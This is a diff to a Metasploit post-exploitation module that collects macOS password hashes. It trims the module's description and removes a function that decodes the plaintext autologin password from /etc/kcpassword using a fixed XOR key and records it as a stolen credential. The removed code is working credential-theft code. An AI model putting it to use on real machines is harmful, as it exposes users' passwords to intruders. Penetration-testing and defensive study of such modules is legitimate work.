@@ -26,9 +26,8 @@ class Metasploit3 < Msf::Post
     super( update_info( info,
         'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
         'Description'   => %q{
-            This module dumps SHA-1, LM, NT, SHA512, SHA512PBKDF2 Hashes on OSX. Supports versions
-            10.4 to 10.9. If any user has autologin enabled, that user's plaintext password will
-            also be collected.
+            This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports versions
+            10.4 to 10.9.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [
@@ -82,32 +81,6 @@ class Metasploit3 < Msf::Post
       i+=1
     end
     return fields
-  end
-
-  # When user account has auto-login enabled, password is stored in /etc/kcpassword file
-  def dump_kcpassword
-    # read the autologin account from prefs plist
-    autouser = cmd_exec 'defaults read /Library/Preferences/com.apple.loginwindow "autoLoginUser" "username"'
-    if autouser.present?
-      print_status "User #{autouser} has autologin enabled, decoding password..."
-    else
-      return
-    end
-
-    kcpass = read_file(KC_PASSWORD_PATH)
-    key = [0x7D, 0x89, 0x52, 0x23, 0xD2, 0xBC, 0xDD, 0xEA, 0xA3, 0xB9, 0x1F]
-    decoded = kcpass.bytes.to_a.each_slice(key.length).map do |kc|
-      kc.each_with_index.map { |byte, idx| byte ^ key[idx] }.map(&:chr).join
-    end.join.sub(/\x00.*$/, '')
-    report_auth_info(
-      :host   => host,
-      :port   => 445,
-      :sname  => 'login',
-      :user   => autouser,
-      :pass   => decoded,
-      :active => true
-    )
-    print_good "Decoded autologin password: #{autouser}:#{decoded}"
   end
 
   # Dump SHA1/SHA512/SHA512PBKDF2 Hashes used by OSX, must be root to get the Hashes
